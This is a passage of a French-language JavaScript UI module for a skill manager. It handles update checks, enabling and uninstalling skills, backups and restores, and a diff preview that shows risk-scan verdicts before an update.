      auto.note = 'La recherche des mises à jour n’a pas répondu en 20 secondes. Réessayez plus tard avec « Rechercher les mises à jour ».';
      paintChk();
    }, AUTO_MAX);
    return SA.live.call('GET', '/api/skills/check').then(function (res) {
      if (gen !== auto.gen) return;
      n = ((res && res.outdated) || []).length;
      /* État relu sans remonter la vue : une confirmation ou un formulaire ouvert le reste. */
      return (SA.live.reload || SA.live.refresh)().then(function () {
        if (gen === auto.gen) auto.note = n ? SA.pl(n, 'mise à jour trouvée', 'mises à jour trouvées') + '.' : 'Tous les skills suivis sont à jour.';
      });
    }).catch(function (e) {
      if (gen === auto.gen) auto.note = 'Recherche des mises à jour impossible. ' + errText(e);
    }).then(function () {
      if (!autoEnd(gen)) return;
      /* Mes skills : ses zones seulement. Autre écran : il est redessiné avec les nouveaux comptes. */
      after();
    });
  }
  function checkNow() {
    if (busy || auto.on || !live()) return null;
    checked = true;
    busy = 'Recherche des mises à jour…'; err = ''; msg = ''; auto.note = '';
    after();
    var n = 0;
    return SA.live.call('GET', '/api/skills/check').then(function (res) {
      n = ((res && res.outdated) || []).length;
      /* La vue redessine ses zones à la fin (after) : pas de nouveau montage. */
      return SA.live.reload ? SA.live.reload() : SA.live.refresh();
    }).then(function () {
      msg = n ? SA.pl(n, 'mise à jour trouvée', 'mises à jour trouvées') + '.' : 'Tous les skills suivis sont à jour.';
    }).catch(function (e) {
      err = errText(e);
    }).then(function () {
      busy = '';
      /* Recherche réussie : le focus reste où il est. */
      focusNext = err ? '.gs-err' : '';
      held = SA.viewId() !== 'gestion';
      after();
    });
  }
  /* done(réponse) rend [message, erreur]. Pendant l'appel, les boutons sont désactivés ; sans réponse, rien n'est changé.
     note : lignes écartées du lot, dites dans le message. back : où rendre le focus après l'appel. */
  function send(label, path, body, done, note, back) {
    if (busy) return null;
    busy = label; err = ''; msg = '';
    after();
    return SA.live.call('POST', path, body).then(function (res) {
      var out = done(res || {}) || [];
      msg = join(out[0], note); err = out[1] || '';
    }).catch(function (e) {
      msg = note || ''; err = errText(e);
    }).then(function () { finish(back); });
  }
  /* Rien à envoyer : seulement dire pourquoi. */
  function skipped(note) {
    if (!note || busy) return null;
    msg = note; err = ''; focusNext = '.gs-msg';
    after();
    return null;
  }
  function updatedMsg(res) {
    var u = res.updated || [], h = res.held || [], hm = SA.state.held = SA.state.held || {};
    u.forEach(function (n) { delete hm[n]; });
    h.forEach(function (n) { hm[n] = true; });
    /* Un skill retiré entre-temps n'est plus retenu. */
    Object.keys(hm).forEach(function (n) { if (!mine().some(function (r) { return folder(r) === n; })) delete hm[n]; });
    return [
      (u.length || !h.length ? SA.pl(u.length, 'skill mis à jour', 'skills mis à jour') + '.' : '') +
        (h.length ? ' ' + h.join(', ') + (h.length > 1 ? ' demandent' : ' demande') + ' votre lecture : la nouvelle version ajoute un motif à risque. Ouvrez « Ce qui change » pour décider.' : ''),
      failText(res.failed)
    ];
  }
  function setOn(list, on, back) {
    list = list.filter(function (r) { return r.kind !== 'plugin'; });
    if (!list.length) return null;
    var p = pick(list);
    if (!p.names.length) return skipped(p.note);
    return send(on ? 'Activation en cours…' : 'Désactivation en cours…', on ? '/api/skills/enable' : '/api/skills/disable', { names: p.names }, function (res) {
      var d = (res.done || []).length;
      return [d ? SA.pl(d, 'skill', 'skills') + (on ? (d > 1 ? ' activés.' : ' activé.') : (d > 1 ? ' désactivés.' : ' désactivé.')) : '', failText(res.failed)];
    }, p.note, back);
  }
  /* Sauvegarde à la demande : nom et note facultatifs, omis quand ils sont vides. */
  function saveNow() {
    var list = (saving || []).map(find).filter(function (r) { return r && r.kind !== 'plugin'; });
    var label = SA.backup.cut(saveL, 80), note = SA.backup.cut(saveN, 500);
    saving = null; saveAt = null; saveL = ''; saveN = '';
    if (!list.length) return null;
    if (live()) {
      var p = pick(list);
      if (!p.names.length) return skipped(p.note);
      var body = { names: p.names };
      if (label) body.label = label;
      if (note) body.note = note;
      return send('Sauvegarde en cours…', '/api/backups/create', body, function (res) {
        var b = res.backup ? SA.normBackup(res.backup) : null;
        return [b ? 'Sauvegarde faite : ' + b.label + ', ' + SA.pl(b.items.length, 'skill', 'skills') + '. Elle figure dans Sauvegardes.' : '', failText(res.failed)];
      }, p.note);
    }
    var b = SA.backup.fromRows(list, 'manual', label, note);
    SA.state.backups.unshift(b);
    msg = 'Sauvegarde faite : ' + b.label + ', ' + SA.pl(list.length, 'skill', 'skills') + '. Elle figure dans Sauvegardes.';
    return null;
  }
  function deleteCall(i) {
    var b = (SA.state.backups || [])[i];
    if (!b) return null;
    return send('Suppression de la sauvegarde en cours…', '/api/backups/delete', { id: b.id }, function () { return ['Sauvegarde supprimée.']; });
  }
  /* Restaurer : un refus pour motif à risque pose la question, puis un seul renvoi avec force. */
  function restoreCall(i, force) {
    var b = (SA.state.backups || [])[i];
    if (!b || busy) return null;
    var nb = SA.normBackup(b), body = { id: b.id };
    if (force) body.force = SA.backup.forceNames(nb, rg && rg.id === String(b.id) ? rg.names : null);
    rg = null;
    busy = 'Restauration en cours…'; err = ''; msg = '';
    after();
    return SA.live.call('POST', '/api/backups/restore', body).then(function () {
      msg = nb.label + ' restaurée : ' + SA.pl(nb.items.length, 'skill remis', 'skills remis') + ' à leur place.';
    }).catch(function (e) {
      if (!force && e && e.code === 'ROUGE') {
        rg = { id: String(b.id), names: Array.isArray(e.names) ? e.names.filter(function (n) { return typeof n === 'string'; }) : null };
        return;
      }
      err = errText(e);
    }).then(function () { finish(rg ? '[data-gs-rg-no]' : ''); });
  }

  function updateMany(list) {
    if (live()) {
      var todo = list.filter(function (r) { return r.st === 'maj'; });
      if (!todo.length) return null;
      var p = pick(todo);
      if (!p.names.length) return skipped(p.note);
      return send('Mise à jour en cours…', '/api/skills/update', { names: p.names }, updatedMsg, p.note);
    }
    var done = 0;
    list.forEach(function (r) {
      if (r.st !== 'maj' || risky(r)) return;
      applyUpdate(r); done++;
    });
    /* Versions à risque restées en attente, envoyées ou non : l'utilisateur sait où décider. */
    var wait = mine().filter(function (r) { return r.st === 'maj' && risky(r); }).map(function (r) { return r.name; });
    msg = ((done || !wait.length ? SA.pl(done, 'skill mis à jour', 'skills mis à jour') + '. ' : '') +
      (wait.length ? wait.join(', ') + (wait.length > 1 ? ' demandent' : ' demande') + ' votre lecture : la nouvelle version ajoute un motif à risque. Ouvrez « Ce qui change » pour décider.' : '')).trim();
  }
  function goneMsg(n, kept) {
    if (!kept) return SA.pl(n, 'skill désinstallé', 'skills désinstallés') + ', sans sauvegarde.';
    return SA.pl(n, 'skill désinstallé', 'skills désinstallés') + '. ' + (kept > 1 ? 'Leurs sauvegardes sont' : 'Sa sauvegarde est') + ' dans l’écran Sauvegardes.';
  }
  /* keepBackup : la case « Garder une sauvegarde » de la confirmation. */
  function uninstall(list, keepBackup) {
    var s = SA.state, gone = {};
    list = list.filter(function (r) { return r.kind !== 'plugin'; });
    if (live()) {
      if (!list.length) return null;
      var p = pick(list);
      if (!p.names.length) return skipped(p.note);
      return send('Désinstallation en cours…', '/api/skills/remove', { names: p.names, backup: !!keepBackup }, function (res) {
        var n = (res.removed || []).length;
        s.lastInstall = s.lastInstall.filter(function (id) { return !!SA.mineRow(id); });
        return [n ? goneMsg(n, (res.backups || []).length) : '', failText(res.failed)];
      }, p.note);
    }
    list.forEach(function (r) { gone[r.id] = true; if (keepBackup) s.backups.unshift(r); });
    s.mine = s.mine.filter(function (r) { return !gone[r.id]; });
    s.lastInstall = s.lastInstall.filter(function (id) { return !gone[id]; });
    Object.keys(gone).forEach(function (id) { delete g().sel[id]; });
    var n = Object.keys(gone).length;
    msg = goneMsg(n, keepBackup ? n : 0);
    return null;
  }

  /* ---------- « Ce qui change » ---------- */
  /* Nouvelle version à risque : annoncée par le contrôle, ou retenue par le serveur lors d'une mise à jour. */
  function risky(r) { return !!(r && ((r.diff && r.diff.scan && r.diff.scan.level === 2) || isHeld(r))); }
  function count(x) { x = Number(x); return isFinite(x) && x > 0 ? Math.round(x) : 0; }
  /* Réponse de GET /api/skills/preview, ramenée à ce que l'écran affiche. Forme inattendue : null. */
  function normPreview(res) {
    if (!res || typeof res !== 'object' || !Array.isArray(res.files)) return null;
    var scan = res.scan && typeof res.scan === 'object' ? res.scan : {}, old = res.scanOld && typeof res.scanOld === 'object' ? res.scanOld : {};
    return {
      files: res.files.filter(function (f) { return f && typeof f.path === 'string'; }).map(function (f) {
        return { path: f.path, status: SA.own(FST, f.status) ? f.status : 'changed', added: count(f.added), removed: count(f.removed) };
      }),
      verdict: SA.own(VERD, scan.verdict) ? scan.verdict : null,
      findings: (Array.isArray(scan.findings) ? scan.findings : []).filter(function (f) { return f && typeof f === 'object'; }),
      old: SA.own(VERD, old.verdict) ? old.verdict : null,
      same: res.same === true
    };
  }
  function later() { return '<button type="button" class="btn" data-gs-later>Plus tard</button>'; }
  function findingsHTML(list) {
    return '<ul class="ledger dt-fd">' + list.map(function (f) {
      var where = [f.file ? String(f.file) : '', f.line == null || f.line === '' ? '' : 'ligne ' + f.line].filter(Boolean).join(' · ');
      return '<li><p class="dt-fd-l">' + esc(f.label || 'Motif à regarder') + '</p>' +
        (where ? '<p class="mono mut dt-fd-f">' + esc(where) + '</p>' : '') +
        (f.excerpt ? '<pre class="code dt-fd-x"><code>' + esc(f.excerpt) + '</code></pre>' : '') + '</li>';
    }).join('') + '</ul>';
  }
  function filesHTML(d) {
    if (d.same) return '<p class="sub">La nouvelle version est identique à la version installée.</p>';
    if (!d.files.length) return '<p class="sub">Aucun fichier ne change.</p>';
    var n = { added: 0, removed: 0, changed: 0 }, add = 0, del = 0;
    d.files.forEach(function (f) { n[f.status]++; add += f.added; del += f.removed; });
    var parts = [n.added ? SA.pl(n.added, 'ajouté', 'ajoutés') : '', n.changed ? SA.pl(n.changed, 'modifié', 'modifiés') : '', n.removed ? SA.pl(n.removed, 'retiré', 'retirés') : ''].filter(Boolean);
    return '<ul class="ledger dt-aud gs-files">' + d.files.map(function (f) {
        return '<li><span class="mono">' + esc(f.path) + '</span><span class="gs-fs gs-fs-' + f.status + '">' + FST[f.status] + '</span>' +
          '<span class="mono gs-fn2"><span class="gs-add">+' + f.added + '</span> <span class="gs-del">−' + f.removed + '</span></span></li>';
      }).join('') + '</ul>' +
      '<p class="mut dt-note">' + SA.pl(d.files.length, 'fichier', 'fichiers') + ' : ' + parts.join(', ') + '. ' +
        SA.pl(add, 'ligne ajoutée', 'lignes ajoutées') + ', ' + SA.pl(del, 'retirée', 'retirées') + '.</p>';
  }
  /* Zone #gs-pv du tiroir : attente, erreur, ou comparaison avec le bouton de mise à jour. */
  function previewHTML(r) {
    var id = esc(r.id);
    if (!pv || pv.loading) {
      return '<p class="gs-msg" role="status">Skill Advisor télécharge la nouvelle version et la compare. Rien n’est écrit.</p>' +
        '<p class="dt-cta">' + later() + '</p>';
    }
    if (pv.err || !pv.data) {
      return '<div class="note note-bad" role="alert"><p class="note-t">Comparaison impossible</p><p class="sub">' + esc(pv.err || 'Réponse inattendue du serveur local.') + '</p></div>' +
        '<p class="dt-cta"><button type="button" class="btn primary" data-gs-pv-retry="' + id + '">Réessayer</button>' + later() + '</p>';
    }
    /* Même règle que le clic : forcé quand la comparaison est à risque ou quand le serveur a déjà retenu cette version. */
    var d = pv.data, v = d.verdict ? VERD[d.verdict] : null, bad = d.verdict === 'rouge' || isHeld(r);
    return '<section class="dt-sec"><h3 class="h2">Contrôle de la nouvelle version</h3>' +
        (v ? '<p class="dt-flag"><span class="bdg ' + v[0] + '">' + v[1] + '</span><span>' + v[2] + '</span></p>'
          : '<p class="sub">Skill Advisor n’a pas pu contrôler la nouvelle version.</p>') +
        (d.old ? '<p class="mut dt-note">Version installée : ' + VERD[d.old][1] + '.</p>' : '') +
        (d.findings.length ? findingsHTML(d.findings) : '') + '</section>' +
      '<section class="dt-sec"><h3 class="h2">Fichiers</h3>' + filesHTML(d) + '</section>' +
      '<p class="dt-cta"><button type="button" class="btn ' + (bad ? 'danger' : 'primary') + '" data-gs-apply="' + id + '"' + (bad ? ' data-gs-force' : '') + dis(r) + '>' +
        (bad ? 'Mettre à jour malgré l’avertissement' : 'Mettre à jour') + '</button>' + later() + '</p>';
  }
  function liveDiffHTML(r) {
    var hold = isHeld(r), id = esc(r.id), n = folder(r);
    return '<div class="dt"><p class="eye">Mise à jour</p><p class="dt-name mono">' + esc(r.name) + '</p>' +
      '<p class="dt-src mono mut">' + esc(r.src) + '</p>' +
      (hold
        ? '<section class="dt-sec"><h3 class="h2">Mise à jour retenue</h3>' +
            '<p class="dt-flag"><span class="bdg bad">' + VERD.rouge[1] + '</span><span>La nouvelle version ajoute un motif à risque. Rien n’a été écrit : la version installée reste en place.</span></p></section>'
        : '') +
      (!live()
        /* Machine d'exemple, sans détail des différences. */
        ? '<p class="sub">Le détail des différences n’est pas connu pour ce skill.</p>' +
          '<p class="dt-cta"><button type="button" class="btn primary" data-gs-apply="' + id + '">Mettre à jour</button>' + later() + '</p>'
        : proj(r) || !n
        /* Skill de projet, ou dossier au nom non valide : le serveur ne peut ni comparer ni mettre à jour. */
        ? '<p class="sub">' + (proj(r) ? PROJ : 'Le nom du dossier de ce skill n’est pas valide. Skill Advisor ne peut pas le mettre à jour.') + '</p>' +
          '<p class="dt-cta"><button type="button" class="btn primary" data-gs-apply="' + id + '" disabled>Mettre à jour</button>' + later() + '</p>'
        : '<div id="gs-pv" class="gs-pv" data-id="' + id + '" aria-live="polite" tabindex="-1">' + previewHTML(r) + '</div>') +
      '</div>';
  }
  /* La zone est réécrite sans rouvrir le tiroir : le focus et le défilement restent. Une réponse arrivée après
     la fermeture, ou pour un autre skill, est ignorée. */
  function paintPreview() {
    if (!pv || !SA.drawerOpen || !document.getElementById) return;
    var el = document.getElementById('gs-pv'), r = find(pv.id);
    if (!el || !r || el.getAttribute('data-id') !== pv.id) return;
    var had = !!(active() && el.contains(active()));
    el.innerHTML = previewHTML(r);
    if (!had) return;
    var b = el.querySelector('[data-gs-later]') || el;
    try { b.focus({ preventScroll: true }); } catch (e) { b.focus(); }
  }
  function loadPreview(r) {
    var me = pv = { id: r.id, loading: true, data: null, err: '' };
    paintPreview();
    return SA.live.call('GET', '/api/skills/preview?name=' + encodeURIComponent(folder(r))).then(function (res) {
      me.data = normPreview(res);
    }).catch(function (e) {
      me.err = errText(e);
    }).then(function () {
      me.loading = false;
      if (pv === me) paintPreview();
    });
  }

  function diffHTML(r) {
    if (live() || !r.diff || !r.diff.files) return liveDiffHTML(r);
    var d = r.diff, add = 0, del = 0;
    d.files.forEach(function (f) { add += f[1]; del += f[2]; });
    return '<div class="dt"><p class="eye">Mise à jour</p><p class="dt-name mono">' + esc(r.name) + '</p>' +
      '<p class="dt-src mono mut">' + esc(r.src) + ' · ' + esc(d.from) + ' → ' + esc(d.to) + '</p>' +
      '<section class="dt-sec"><h3 class="h2">Contrôle de la nouvelle version</h3>' +
        '<p class="dt-flag"><span class="bdg ' + (d.scan.level === 2 ? 'bad' : 'ok') + '">' + (d.scan.level === 2 ? VERD.rouge[1] : VERD.vert[1]) + '</span><span>' + esc(d.scan.text) + '</span></p></section>' +
      '<section class="dt-sec"><h3 class="h2">Fichiers</h3>' +
        '<ul class="ledger dt-aud">' + d.files.map(function (f) { return '<li><span class="mono">' + esc(f[0]) + '</span><span class="mono"><span class="gs-add">+' + f[1] + '</span> <span class="gs-del">−' + f[2] + '</span></span></li>'; }).join('') + '</ul>' +
        '<p class="mut dt-note">' + SA.pl(d.files.length, 'fichier', 'fichiers') + ', ' + add + ' lignes ajoutées, ' + del + ' retirées.</p></section>' +
      '<section class="dt-sec"><h3 class="h2">Extrait des différences</h3>' +
        '<pre class="code gs-diff" tabindex="0"><code>' + d.lines.map(function (l) { return '<span class="gs-l gs-l' + (l[0] === '+' ? 'a' : l[0] === '-' ? 'd' : 'c') + '">' + esc(l[0] + ' ' + l[1]) + '</span>'; }).join('') + '</code></pre>' +
        '<p class="mut dt-note">Skill fictif de la machine d’exemple. L’ancienne version est gardée : elle sert à cette comparaison et à la sauvegarde.</p></section>' +
      '<p class="dt-cta"><button type="button" class="btn ' + (d.scan.level === 2 ? 'danger' : 'primary') + '" data-gs-apply="' + esc(r.id) + '">' + (d.scan.level === 2 ? 'Mettre à jour malgré l’avertissement' : 'Mettre à jour') + '</button>' +
      later() + '</p></div>';
  }
  function openDiff(id) {
    var r = find(id);
    if (!r || !(r.diff || (live() && r.st === 'maj'))) return;
    bindDoc();
    var ask = live() && !proj(r) && !!folder(r);
    pv = ask ? { id: r.id, loading: true, data: null, err: '' } : null;
    SA.openDrawer(diffHTML(r), 'Ce qui change');
    if (ask) loadPreview(r);
  }

  /* Boutons du tiroir : hors de la vue, une seule écoute au document. */
  function bindDoc() {
    if (bound) return;
    bound = true;
    document.addEventListener('click', function (e) {
      var t = e.target && e.target.closest ? e.target : null;
      if (!t) return;
      var a = t.closest('[data-gs-apply]');
      if (a) {
        if (a.disabled) return;
        var r = find(a.getAttribute('data-gs-apply'));
        /* Forcé seulement quand le bouton l'annonce (comparaison à risque), ou quand le serveur a déjà retenu cette version. */
        var bad = a.hasAttribute('data-gs-force') || risky(r);
        if (live()) {
          if (!r || busy || proj(r)) return;
          SA.closeDrawer();
          /* Ouvert depuis « Ma machine » : le résultat s'affiche dans Mes skills. */
          if (SA.viewId() !== 'gestion') SA.setRoute('gestion');
          var n = folder(r);
          if (!n) { skipped(pick([r]).note); return; }
          send('Mise à jour en cours…', '/api/skills/update', bad ? { names: [n], force: [n] } : { names: [n] }, updatedMsg);
          return;
        }
        applyUpdate(r);
        msg = r ? r.name + ' mis à jour.' + (bad ? ' Il passe « à relire ».' : '') : '';
        SA.closeDrawer();
        focusNext = '.gs-msg';
        if (SA.viewId() === 'gestion') refresh(); else SA.repaint();
        return;
      }
      if (t.closest('[data-gs-later]')) { SA.closeDrawer(); return; }
      var again = t.closest('[data-gs-pv-retry]');
      if (again && live()) { var rr = find(again.getAttribute('data-gs-pv-retry')); if (rr && folder(rr) && !proj(rr)) loadPreview(rr); }
    });
  }

  function cancelSave() {
    focusNext = saveAt ? ['data-gs-save', saveAt] : '[data-gs-bulk="save"]';
    saving = null; saveAt = null;
  }
  function submitSave() {
    focusNext = '.gs-msg';
    saveNow();
    return live() && !!busy;
  }

  function onClick(e) {
    var t = e.target.closest('button');
    if (!t || !wrap.contains(t) || t.disabled || t.getAttribute('aria-disabled') === 'true') return;
    var s = g(), v, on;
    function has(n) { return t.hasAttribute(n); }
    /* Pendant un appel au serveur, seuls la lecture, les filtres et la sélection restent possibles. */
    if (busy && !['data-gs-f', 'data-gs-view', 'data-gs-gaps', 'data-gs-reset', 'data-gs-sel'].some(has)) return;
    if (has('data-gs-f')) { s.f = t.getAttribute('data-gs-f'); armed = null; }
    else if (has('data-gs-view')) { s.view = t.getAttribute('data-gs-view'); armed = null; }
    else if (has('data-gs-gaps')) s.gapsOnly = !s.gapsOnly;
    else if (has('data-gs-reset')) { s.f = 'tous'; s.q = ''; s.gapsOnly = false; wrap.querySelector('#gs-q').value = ''; focusNext = '#gs-q'; }
    else if (has('data-gs-sel')) {
      v = t.getAttribute('data-gs-sel');
      if (v === 'all') {
        var list = rows(), all = list.every(function (r) { return s.sel[r.id]; });
        list.forEach(function (r) { if (all) delete s.sel[r.id]; else s.sel[r.id] = true; });
      } else if (s.sel[v]) delete s.sel[v]; else s.sel[v] = true;
      if (armed === 'bulk') armed = null;
    }
    else if (has('data-gs-on')) {
      v = find(t.getAttribute('data-gs-on'));
      /* Le focus reste sur l'interrupteur, pendant et après l'appel. */
      if (live()) { if (v) setOn([v], v.on === false, ['data-gs-on', v.id]); return; }
      if (v) v.on = v.on === false; msg = '';
    }
    else if (has('data-gs-diff')) { openDiff(t.getAttribute('data-gs-diff')); return; }
    else if (has('data-gs-adopt')) {
      v = find(t.getAttribute('data-gs-adopt'));
      if (v && v.match && !live()) { v.st = 'ok'; v.src = v.match; delete v.match; delete v.kind; msg = v.name + ' est maintenant géré : il se mettra à jour comme les autres.'; focusNext = '.gs-msg'; }
    }
    else if (has('data-gs-keep')) { keep = !keep; focusNext = '[data-gs-keep]'; }
    else if (has('data-gs-un')) {
      v = t.getAttribute('data-gs-un');
      if (armed === v) { armed = null; focusNext = ['data-gs-un', v]; }
      else { armed = v; saving = null; saveAt = null; keep = true; focusNext = '[data-gs-un-no]'; }
    }
    else if (has('data-gs-un-no')) { focusNext = ['data-gs-un', armed]; armed = null; }
    else if (has('data-gs-un-ok')) {
      v = find(t.getAttribute('data-gs-un-ok')); armed = null; focusNext = '.gs-msg';
      if (v) uninstall([v], keep);
      if (v && live()) return;
    }
    else if (has('data-gs-check')) { checkNow(); return; }
    else if (has('data-gs-all')) { updateMany(mine().filter(function (r) { return !risky(r); })); if (live() && busy) return; }
    else if (has('data-gs-bulk')) {
      v = t.getAttribute('data-gs-bulk');
      var sel = selected();
      if (live() && (v === 'maj' || v === 'off' || v === 'on' || v === 'un-ok')) {
        if (v === 'un-ok') { armed = null; focusNext = '.gs-msg'; uninstall(sel, keep); }
        else if (v === 'maj') updateMany(sel);
        else setOn(sel, v === 'on');
        if (busy) return;
      }
      else if (v === 'maj') updateMany(sel);
      else if (v === 'off' || v === 'on') { sel.forEach(function (r) { if (r.kind !== 'plugin') r.on = v === 'on'; }); msg = SA.pl(sel.filter(function (r) { return r.kind !== 'plugin'; }).length, 'skill', 'skills') + (v === 'on' ? ' activés.' : ' désactivés.'); }
      else if (v === 'save') {
        saving = sel.filter(function (r) { return r.kind !== 'plugin'; }).map(function (r) { return r.id; });
        saveAt = null;
        if (!saving.length) saving = null;
        else { armed = null; saveL = ''; saveN = ''; focusNext = '#gs-save-l'; }
      }
      else if (v === 'un') { armed = 'bulk'; saving = null; saveAt = null; keep = true; focusNext = '[data-gs-bulk="un-no"]'; }
      else if (v === 'un-no') { armed = null; focusNext = '[data-gs-bulk="un"]'; }
      else if (v === 'un-ok') { armed = null; uninstall(sel, keep); focusNext = '.gs-msg'; }
      else if (v === 'clear') { s.sel = {}; armed = null; focusNext = '#gs-q'; }
    }
    else if (has('data-gs-restore') || has('data-gs-bk-del')) {
      on = has('data-gs-bk-del');
      v = Number(t.getAttribute(on ? 'data-gs-bk-del' : 'data-gs-restore'));
      if (live()) { if (on) deleteCall(v); else restoreCall(v, false); return; }
      if (on) { SA.state.backups.splice(v, 1); msg = 'Sauvegarde supprimée.'; focusNext = '.gs-msg'; }
      else if (SA.state.backups[v]) {
        var rs = SA.backup.restoreDemo(SA.state.backups[v]);
        if (rs.ok) { msg = rs.text; err = ''; focusNext = '.gs-msg'; } else { msg = ''; err = rs.text; focusNext = '.gs-err'; }
      }
    }
    else if (has('data-gs-rg-ok')) { if (rg) restoreCall(0, true); return; }
    else if (has('data-gs-rg-no')) { rg = null; focusNext = '[data-gs-restore]'; }
    else if (has('data-gs-save')) {
      v = find(t.getAttribute('data-gs-save'));
      if (v && v.kind !== 'plugin') {
        if (saving && saveAt === v.id) cancelSave();
        else { saving = [v.id]; saveAt = v.id; armed = null; saveL = ''; saveN = ''; focusNext = '#gs-save-l'; }
      }
    }
    else if (has('data-gs-save-no')) cancelSave();
    else if (has('data-gs-save-ok')) { if (submitSave()) return; }
    else return;
    refresh();
  }

  /* Échap annule la confirmation ou le formulaire ouvert et rend le focus au bouton d'origine. Entrée valide le formulaire. */
  function onKey(e) {
    var t = e.target || {};
    if (e.key === 'Enter' && (t.id === 'gs-save-l' || t.id === 'gs-save-n')) {
      e.preventDefault();
      if (busy || !saving) return;
      if (!submitSave()) refresh();
      return;
    }
    if (e.key !== 'Escape' || busy) return;
    /* Échap tapé dans un champ agit sur ce champ seulement : la recherche est vidée par le cœur, le formulaire
       « Sauvegarder » se ferme depuis son nom ou sa note. Une confirmation de ligne ou la question de restauration reste ouverte. */
    if (t.id === 'gs-save-l' || t.id === 'gs-save-n') {
      if (!saving) return;
      cancelSave();
      e.preventDefault();
      e.stopPropagation();
      refresh();
      return;
    }
    if (t.id === 'gs-q' || t.id === 'gs-sort' || /^(input|textarea|select)$/i.test(String(t.localName || t.tagName || ''))) return;
    if (armed === 'bulk') { armed = null; focusNext = '[data-gs-bulk="un"]'; }
    else if (armed) { focusNext = ['data-gs-un', armed]; armed = null; }
    else if (saving) cancelSave();
    else if (rg) { rg = null; focusNext = '[data-gs-restore]'; }
    else return;
    e.preventDefault();
    e.stopPropagation();
    refresh();
  }

  function mount(root) {
    wrap = root.querySelector('.gs');
    armed = null;
    keep = true;
    saving = null;
    saveAt = null;
    rg = null;
    /* Un appel en cours, ou terminé ailleurs, garde son message jusqu'ici. */
    if (!busy && !held) { msg = ''; err = ''; }
    held = false;
    if (!wrap) return;
    bindDoc();
    wrap.addEventListener('click', onClick);
    wrap.addEventListener('keydown', onKey);
    /* Première visite de la page en mode réel : la recherche des mises à jour part d'elle-même. */
    if (live() && !checked && mine().some(function (r) { return r.st !== 'ng'; })) setTimeout(autoCheck, 300);
    wrap.addEventListener('input', function (e) {
      if (e.target.id === 'gs-save-l') { saveL = String(e.target.value || ''); return; }
      if (e.target.id === 'gs-save-n') { saveN = String(e.target.value || ''); return; }
      if (e.target.id !== 'gs-q') return;
      g().q = e.target.value;
      clearTimeout(typeT);
      typeT = setTimeout(refresh, 100);
    });
    wrap.addEventListener('change', function (e) {
      if (e.target.id !== 'gs-sort') return;
      g().sort = e.target.value;
      refresh();
      var sel = wrap.querySelector('#gs-sort');
      if (sel) sel.focus({ preventScroll: true });
    });
  }

  SA.views.gestion = {
    wide: true,
    render: render,
    mount: mount,
    actions: function () { return []; },
    openDiff: openDiff
  };
})();
